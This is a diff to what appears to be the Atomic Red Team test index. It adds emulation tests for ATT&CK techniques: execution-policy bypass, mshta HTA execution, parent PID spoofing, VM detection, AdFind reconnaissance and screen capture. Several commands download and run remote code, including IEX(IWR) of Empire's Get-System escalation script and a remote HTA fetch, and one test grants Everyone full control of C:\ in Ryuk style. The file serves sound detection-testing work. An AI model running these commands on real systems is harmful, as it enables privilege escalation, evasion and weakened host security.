+      - windows
+      input_arguments:
+        default_execution_policy:
+          description: Specify the default poweshell execution policy
+          type: String
+          default: Default
+      executor:
+        command: 'Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine
+
+'
+        cleanup_command: 'Set-ExecutionPolicy -ExecutionPolicy #{default_execution_policy}
+          -Scope LocalMachine
+
+'
+        name: powershell
   T1218.005:
     technique:
       id: attack-pattern--840a987a-99bd-4a80-a5c9-0cb2baa6cade
@@ -28840,6 +29478,196 @@ defense-evasion:
         cleanup_command: 'remove-item "#{temp_file}" -ErrorAction Ignore
 
 '
+        name: powershell
+    - name: Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral
+        Movement
+      auto_generated_guid: 007e5672-2088-4853-a562-7490ddc19447
+      description: Executes an HTA Application using JScript script engine using local
+        UNC path simulating lateral movement.
+      supported_platforms:
+      - windows
+      input_arguments:
+        script_engine:
+          description: Script Engine to use
+          type: string
+          default: JScript
+        hta_file_path:
+          description: HTA file name and or path to be used
+          type: string
+          default: Test.hta
+        mshta_file_path:
+          description: Location of mshta.exe
+          type: string
+          default: "$env:windir\\system32\\mshta.exe"
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine
+          #{script_engine} -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath
+          #{mshta_file_path}'
+        name: powershell
+    - name: Invoke HTML Application - Jscript Engine Simulating Double Click
+      auto_generated_guid: 58a193ec-131b-404e-b1ca-b35cf0b18c33
+      description: Executes an HTA Application using JScript script engine simulating
+        double click.
+      supported_platforms:
+      - windows
+      input_arguments:
+        script_engine:
+          description: Script Engine to use
+          type: string
+          default: JScript
+        hta_file_path:
+          description: HTA file name and or path to be used
+          type: string
+          default: Test.hta
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine
+          #{script_engine} -SimulateUserDoubleClick'
+        name: powershell
+    - name: Invoke HTML Application - Direct download from URI
+      auto_generated_guid: 39ceed55-f653-48ac-bd19-aceceaf525db
+      description: Executes an HTA Application by directly downloading from remote
+        URI.
+      supported_platforms:
+      - windows
+      input_arguments:
+        mshta_file_path:
+          description: Location of mshta.exe
+          type: string
+          default: "$env:windir\\system32\\mshta.exe"
+        hta_uri:
+          description: URI to HTA
+          type: string
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Invoke-ATHHTMLApplication -HTAUri #{hta_uri} -MSHTAFilePath #{mshta_file_path}'
+        name: powershell
+    - name: Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol
+        Handler
+      auto_generated_guid: e7e3a525-7612-4d68-a5d3-c4649181b8af
+      description: Executes an HTA Application with JScript Engine, Rundll32 and Inline
+        Protocol Handler.
+      supported_platforms:
+      - windows
+      input_arguments:
+        rundll32_file_path:
+          description: Location of rundll32.exe
+          type: string
+          default: "$env:windir\\system32\\rundll32.exe"
+        script_engine:
+          description: Script Engine to use
+          type: string
+          default: JScript
+        protocol_handler:
+          description: Protocol Handler to use
+          type: string
+          default: About
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler
+          #{protocol_handler} -UseRundll32 -Rundll32FilePath #{rundll32_file_path}'
+        name: powershell
+    - name: Invoke HTML Application - JScript Engine with Inline Protocol Handler
+      auto_generated_guid: d3eaaf6a-cdb1-44a9-9ede-b6c337d0d840
+      description: Executes an HTA Application with JScript Engine and Inline Protocol
+        Handler.
+      supported_platforms:
+      - windows
+      input_arguments:
+        mshta_file_path:
+          description: Location of mshta.exe
+          type: string
+          default: "$env:windir\\system32\\mshta.exe"
+        script_engine:
+          description: Script Engine to use
+          type: string
+          default: JScript
+        protocol_handler:
+          description: Protocol Handler to use
+          type: string
+          default: About
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler
+          #{protocol_handler} -MSHTAFilePath #{mshta_file_path}'
+        name: powershell
+    - name: Invoke HTML Application - Simulate Lateral Movement over UNC Path
+      auto_generated_guid: b8a8bdb2-7eae-490d-8251-d5e0295b2362
+      description: Executes an HTA Application with Simulate lateral movement over
+        UNC Path.
+      supported_platforms:
+      - windows
+      input_arguments:
+        mshta_file_path:
+          description: Location of mshta.exe
+          type: string
+          default: "$env:windir\\system32\\mshta.exe"
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath
+          #{mshta_file_path}'
         name: powershell
   T1218.007:
     technique:
@@ -29739,6 +30567,134 @@ defense-evasion:
         cleanup_command: |
           Stop-Process -Name "#{dll_process_name}" -ErrorAction Ignore
           Stop-Process -Name "#{spawnto_process_name}" -ErrorAction Ignore
+        name: powershell
+    - name: Parent PID Spoofing - Spawn from Current Process
+      auto_generated_guid: 14920ebd-1d61-491a-85e0-fe98efe37f25
+      description: Spawns a powershell.exe process as a child of the current process.
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_path:
+          description: File path or name of process to spawn
+          type: path
+          default: "$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        parent_pid:
+          description: PID of process to spawn from
+          type: string
+          default: "$PID"
+        command_line:
+          description: Specified command line to use
+          type: string
+          default: "-Command Start-Sleep 10"
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine
+          ''#{command_line}'' -ParentId #{parent_pid}'
+        name: powershell
+    - name: Parent PID Spoofing - Spawn from Specified Process
+      auto_generated_guid: cbbff285-9051-444a-9d17-c07cd2d230eb
+      description: Spawns a notepad.exe process as a child of the current process.
+      supported_platforms:
+      - windows
+      input_arguments:
+        parent_pid:
+          description: PID of process to spawn from
+          type: string
+          default: "$PID"
+        test_guid:
+          description: Defined test GUID
+          type: string
+          default: 12345678-1234-1234-1234-123456789123
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Start-ATHProcessUnderSpecificParent  -ParentId #{parent_pid} -TestGuid
+          #{test_guid}'
+        name: powershell
+    - name: Parent PID Spoofing - Spawn from svchost.exe
+      auto_generated_guid: e9f2b777-3123-430b-805d-5cedc66ab591
+      description: Spawnd a process as a child of the first accessible svchost.exe
+        process.
+      supported_platforms:
+      - windows
+      input_arguments:
+        command_line:
+          description: Specified command line to use
+          type: string
+          default: "-Command Start-Sleep 10"
+        file_path:
+          description: File path or name of process to spawn
+          type: path
+          default: "$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Get-CimInstance -ClassName Win32_Process -Property Name, CommandLine,
+          ProcessId -Filter "Name = ''svchost.exe'' AND CommandLine LIKE ''%''" |
+          Select-Object -First 1 | Start-ATHProcessUnderSpecificParent -FilePath #{file_path}
+          -CommandLine ''#{command_line}'''
+        name: powershell
+    - name: Parent PID Spoofing - Spawn from New Process
+      auto_generated_guid: 2988133e-561c-4e42-a15f-6281e6a9b2db
+      description: Creates a notepad.exe process and then spawns a powershell.exe
+        process as a child of it.
+      supported_platforms:
+      - windows
+      input_arguments:
+        command_line:
+          description: Specified command line to use
+          type: string
+          default: "-Command Start-Sleep 10"
+        file_path:
+          description: File path or name of process to spawn
+          type: path
+          default: "$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        parent_name:
+          description: Parent process to spoof from
+          type: path
+          default: "$Env:windir\\System32\\notepad.exe"
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Start-Process -FilePath #{parent_name} -PassThru | Start-ATHProcessUnderSpecificParent
+          -FilePath #{file_path} -CommandLine ''#{command_line}'''
         name: powershell
   T1550.002:
     technique:
@@ -33714,7 +34670,60 @@ defense-evasion:
       - Signature-based detection
       - Host forensic analysis
       - Anti-virus
-    atomic_tests: []
+      identifier: T1497.001
+    atomic_tests:
+    - name: Detect Virtualization Environment (Linux)
+      auto_generated_guid: dfbd1a21-540d-4574-9731-e852bd6fe840
+      description: |
+        systemd-detect-virt detects execution in a virtualized environment.
+        At boot, dmesg stores a log if a hypervisor is detected.
+      supported_platforms:
+      - linux
+      executor:
+        name: sh
+        elevation_required: true
+        command: 'if (systemd-detect-virt || sudo dmidecode | egrep -i ''manufacturer|product|vendor''
+          | grep -iE ''Oracle|VirtualBox|VMWare|Parallels'') then echo "Virtualization
+          Environment detected"; fi;
+
+'
+    - name: Detect Virtualization Environment (Windows)
+      auto_generated_guid: 502a7dc4-9d6f-4d28-abf2-f0e84692562d
+      description: 'Windows Management Instrumentation(WMI) objects contains system
+        information which helps to detect virtualization. This command will specifically
+        attempt to get the CurrentTemperature value from this object and will check
+        to see if the attempt results in an error that contains the word supported.
+        This is meant to find the result of Not supported, which is the result if
+        run in a virtual machine
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $error.clear()
+          Get-WmiObject -Query "SELECT * FROM MSAcpi_ThermalZoneTemperature" -ErrorAction SilentlyContinue
+          if($error) {echo "Virtualization Environment detected"}
+        cleanup_command: "$error.clear()\n"
+    - name: Detect Virtualization Environment (MacOS)
+      auto_generated_guid: a960185f-aef6-4547-8350-d1ce16680d09
+      description: 'ioreg contains registry entries for all the device drivers in
+        the system. If it''s a virtual machine, one of the device manufacturer will
+        be a Virtualization Software.
+
+'
+      supported_platforms:
+      - macos
+      executor:
+        name: sh
+        elevation_required: false
+        command: 'if (ioreg -l | grep -e Manufacturer -e ''Vendor Name'' | grep -iE
+          ''Oracle|VirtualBox|VMWare|Parallels'') then echo ''Virtualization Environment
+          detected''; fi;
+
+'
   T1542.001:
     technique:
       id: attack-pattern--16ab6452-c3c1-497c-a47d-206018ca1ada
@@ -34388,7 +35397,34 @@ defense-evasion:
       - File system access controls
       x_mitre_is_subtechnique: true
       x_mitre_version: '1.0'
-    atomic_tests: []
+      identifier: T1134.001
+    atomic_tests:
+    - name: Named pipe client impersonation
+      auto_generated_guid: 90db9e27-8e7c-4c04-b602-a45927884966
+      description: |-
+        Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script creates a named pipe, and a service that writes to that named pipe. When the service connects to the named pipe, the script impersonates its security context.
+        When executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).
+
+        Reference: https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/
+      supported_platforms:
+      - windows
+      executor:
+        command: IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1');
+          Get-System -Technique NamedPipe -Verbose
+        name: powershell
+        elevation_required: true
+    - name: "`SeDebugPrivilege` token duplication"
+      auto_generated_guid: 34f0a430-9d04-4d98-bcb5-1989f14719f0
+      description: |-
+        Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script uses `SeDebugPrivilege` to obtain, duplicate and impersonate the token of a another process.
+        When executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).
+      supported_platforms:
+      - windows
+      executor:
+        command: IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1');
+          Get-System -Technique Token -Verbose
+        name: powershell
+        elevation_required: true
   T1205:
     technique:
       revoked: false
@@ -35094,7 +36130,7 @@ defense-evasion:
           default: Everyone
       dependency_executor_name: command_prompt
       dependencies:
-      - description: 'Test requrires a file to modifyto be located at (#{file_or_folder})
+      - description: 'Test requrires a file to modify to be located at (#{file_or_folder})
 
 '
         prereq_command: 'IF EXIST #{file_or_folder} ( EXIT 0 ) ELSE ( EXIT 1 )
@@ -35105,7 +36141,7 @@ defense-evasion:
           echo T1222.001_cacls1 >> #{file_or_folder}\T1222.001_cacls1.txt
           echo T1222.001_cacls2 >> #{file_or_folder}\T1222.001_cacls2.txt
       executor:
-        command: 'Icacls.exe #{file_or_folder} /grant #{user_or_group}:F
+        command: 'icacls.exe #{file_or_folder} /grant #{user_or_group}:F
 
 '
         name: command_prompt
@@ -35140,6 +36176,15 @@ defense-evasion:
 
 '
         name: command_prompt
+    - name: Grant Full Access to Entire C:\ Drive for Everyone - Ryuk Ransomware Style
+      auto_generated_guid: ac7e6118-473d-41ec-9ac0-ef4f1d1ed2f6
+      description: Invokes the command line used by Ryuk Ransomware to grant full
+        access to the entire C:\ drive for Everyone.
+      supported_platforms:
+      - windows
+      executor:
+        command: icacls "C:\*" /grant Everyone:F /T /C /Q
+        name: powershell
   T1220:
     technique:
       id: attack-pattern--ebbe170d-aa74-4946-8511-9921243415a3
@@ -38082,6 +39127,42 @@ discovery:
 
 '
         name: powershell
+    - name: Adfind - Enumerate Active Directory Admins
+      auto_generated_guid: b95fd967-4e62-4109-b48d-265edfd28c3a
+      description: |
+        Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Admin accounts
+        reference- http://www.joeware.net/freetools/tools/adfind/, https://stealthbits.com/blog/fun-with-active-directorys-admincount-attribute/
+      supported_platforms:
+      - windows
+      executor:
+        command: 'PathToAtomicsFolder\T1087.002\src\AdFind -sc admincountdmp
+
+'
+        name: command_prompt
+    - name: Adfind - Enumerate Active Directory User Objects
+      auto_generated_guid: e1ec8d20-509a-4b9a-b820-06c9b2da8eb7
+      description: |
+        Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory User Objects
+        reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
+      supported_platforms:
+      - windows
+      executor:
+        command: 'PathToAtomicsFolder\T1087.002\src\AdFind -f (objectcategory=person)
+
+'
+        name: command_prompt
+    - name: Adfind - Enumerate Active Directory Exchange AD Objects
+      auto_generated_guid: 5e2938fb-f919-47b6-8b29-2f6a1f718e99
+      description: |
+        Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Exchange Objects
+        reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
+      supported_platforms:
+      - windows
+      executor:
+        command: 'PathToAtomicsFolder\T1087.002\src\AdFind -sc exchaddresses
+
+'
+        name: command_prompt
   T1069.002:
     technique:
       external_references:
@@ -38250,6 +39331,18 @@ discovery:
           -eq $TRUE}
 
 '
+    - name: Adfind - Query Active Directory Groups
+      auto_generated_guid: 48ddc687-82af-40b7-8472-ff1e742e8274
+      description: |
+        Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Groups
+        reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
+      supported_platforms:
+      - windows
+      executor:
+        command: 'PathToAtomicsFolder\T1087.002\src\AdFind -f (objectcategory=group)
+
+'
+        name: command_prompt
   T1482:
     technique:
       created: '2019-02-14T16:15:05.974Z'
@@ -38397,6 +39490,30 @@ discovery:
           Get-ADDomain
           Get-ADGroupMember Administrators -Recursive
         name: powershell
+    - name: Adfind - Enumerate Active Directory OUs
+      auto_generated_guid: d1c73b96-ab87-4031-bad8-0e1b3b8bf3ec
+      description: |
+        Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory OUs
+        reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
+      supported_platforms:
+      - windows
+      executor:
+        command: 'PathToAtomicsFolder\T1087.002\src\AdFind -f (objectcategory=organizationalUnit)
+
+'
+        name: command_prompt
+    - name: Adfind - Enumerate Active Directory Trusts
+      auto_generated_guid: 15fe436d-e771-4ff3-b655-2dca9ba52834
+      description: |
+        Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Trusts
+        reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
+      supported_platforms:
+      - windows
+      executor:
+        command: 'PathToAtomicsFolder\T1087.002\src\AdFind -gcb -sc trustdmp
+
+'
+        name: command_prompt
   T1087.003:
     technique:
       external_references:
@@ -39741,17 +40858,11 @@ discovery:
       auto_generated_guid: 8f7578c4-9863-4d83-875c-a565573bbdf0
       description: |
         Query Windows Registry.
-
         Upon successful execution, cmd.exe will perform multiple reg queries. Some will succeed and others will fail (dependent upon OS).
-
         References:
-
         https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order
-
         https://blog.cylance.com/windows-registry-persistence-part-1-introduction-attack-phases-and-windows-services
-
         http://www.handgrep.se/repository/cheatsheets/postexploitation/WindowsPost-Exploitation.pdf
-
         https://www.offensive-security.com/wp-content/uploads/2015/04/wp.Registry_Quick_Find_Chart.en_us.pdf
       supported_platforms:
       - windows
@@ -40061,6 +41172,30 @@ discovery:
 '
         name: command_prompt
         elevation_required: true
+    - name: Adfind - Enumerate Active Directory Computer Objects
+      auto_generated_guid: a889f5be-2d54-4050-bd05-884578748bb4
+      description: |
+        Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Computer Objects
+        reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
+      supported_platforms:
+      - windows
+      executor:
+        command: 'PathToAtomicsFolder\T1087.002\src\AdFind -f (objectcategory=computer)
+
+'
+        name: command_prompt
+    - name: Adfind - Enumerate Active Directory Domain Controller Objects
+      auto_generated_guid: 5838c31e-a0e2-4b9f-b60a-d79d2cb7995e
+      description: |
+        Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Domain Controller Objects
+        reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
+      supported_platforms:
+      - windows
+      executor:
+        command: 'PathToAtomicsFolder\T1087.002\src\AdFind -sc dclist
+
+'
+        name: command_prompt
   T1518.001:
     technique:
       external_references:
@@ -40363,7 +41498,60 @@ discovery:
       - Signature-based detection
       - Host forensic analysis
       - Anti-virus
-    atomic_tests: []
+      identifier: T1497.001
+    atomic_tests:
+    - name: Detect Virtualization Environment (Linux)
+      auto_generated_guid: dfbd1a21-540d-4574-9731-e852bd6fe840
+      description: |
+        systemd-detect-virt detects execution in a virtualized environment.
+        At boot, dmesg stores a log if a hypervisor is detected.
+      supported_platforms:
+      - linux
+      executor:
+        name: sh
+        elevation_required: true
+        command: 'if (systemd-detect-virt || sudo dmidecode | egrep -i ''manufacturer|product|vendor''
+          | grep -iE ''Oracle|VirtualBox|VMWare|Parallels'') then echo "Virtualization
+          Environment detected"; fi;
+
+'
+    - name: Detect Virtualization Environment (Windows)
+      auto_generated_guid: 502a7dc4-9d6f-4d28-abf2-f0e84692562d
+      description: 'Windows Management Instrumentation(WMI) objects contains system
+        information which helps to detect virtualization. This command will specifically
+        attempt to get the CurrentTemperature value from this object and will check
+        to see if the attempt results in an error that contains the word supported.
+        This is meant to find the result of Not supported, which is the result if
+        run in a virtual machine
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $error.clear()
+          Get-WmiObject -Query "SELECT * FROM MSAcpi_ThermalZoneTemperature" -ErrorAction SilentlyContinue
+          if($error) {echo "Virtualization Environment detected"}
+        cleanup_command: "$error.clear()\n"
+    - name: Detect Virtualization Environment (MacOS)
+      auto_generated_guid: a960185f-aef6-4547-8350-d1ce16680d09
+      description: 'ioreg contains registry entries for all the device drivers in
+        the system. If it''s a virtual machine, one of the device manufacturer will
+        be a Virtualization Software.
+
+'
+      supported_platforms:
+      - macos
+      executor:
+        name: sh
+        elevation_required: false
+        command: 'if (ioreg -l | grep -e Manufacturer -e ''Vendor Name'' | grep -iE
+          ''Oracle|VirtualBox|VMWare|Parallels'') then echo ''Virtualization Environment
+          detected''; fi;
+
+'
   T1082:
     technique:
       created: '2017-05-31T21:31:04.307Z'
@@ -40704,6 +41892,18 @@ discovery:
 
 '
         name: powershell
+    - name: Adfind - Enumerate Active Directory Subnet Objects
+      auto_generated_guid: 9bb45dd7-c466-4f93-83a1-be30e56033ee
+      description: |
+        Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Subnet Objects
+        reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
+      supported_platforms:
+      - windows
+      executor:
+        command: 'PathToAtomicsFolder\T1087.002\src\AdFind -f (objectcategory=subnet)
+
+'
+        name: command_prompt
   T1049:
     technique:
       object_marking_refs:
@@ -45137,7 +46337,7 @@ lateral-movement:
       - Windows
       identifier: T1021.001
     atomic_tests:
-    - name: RDPto-DomainController
+    - name: RDP to DomainController
       auto_generated_guid: 355d4632-8cb9-449d-91ce-b566d0253d3e
       description: 'Attempt an RDP session via Remote Desktop Application to a DomainController.
 
@@ -51286,9 +52486,10 @@ collection:
 
 '
         name: bash
-    - name: Import
+    - name: Capture Linux Desktop using Import Tool
       auto_generated_guid: 9cd1cccb-91e4-4550-9139-e20a586fcea1
-      description: 'Use import command to collect a full desktop screenshot
+      description: 'Use import command from ImageMagick to collect a full desktop
+        screenshot
 
 '
       supported_platforms:
@@ -51298,6 +52499,16 @@ collection:
           description: Output file path
           type: Path
           default: "/tmp/T1113_desktop.png"
+      dependencies:
+      - description: 'ImageMagick must be installed
+
+'
+        prereq_command: 'if import --version; then exit 0; else exit 1; fi
+
+'
+        get_prereq_command: 'sudo apt-get -y install imagemagick
+
+'
       executor:
         command: 'import -window root #{output_file}
 
@@ -51306,6 +52517,34 @@ collection:
 
 '
         name: bash
+    - name: Windows Screencapture
+      auto_generated_guid: 3c898f62-626c-47d5-aad2-6de873d69153
+      description: 'Use Psr.exe binary to collect screenshots of user display. Test
+        will do left mouse click to simulate user behaviour
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        output_file:
+          description: Output file path
+          type: Path
+          default: c:\temp\T1113_desktop.zip
+        recording_time:
+          description: Time to take screenshots
+          type: String
+          default: 5
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          cmd /c start /b psr.exe /start /output #{output_file} /sc 1 /gui 0 /stopevent 12
+          Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);' -Name U32 -Namespace W;
+          [W.U32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0);
+          cmd /c "timeout #{recording_time} > NULL && psr.exe /stop"
+        cleanup_command: 'rm #{output_file}
+
+'
   T1213.002:
     technique:
       external_references:
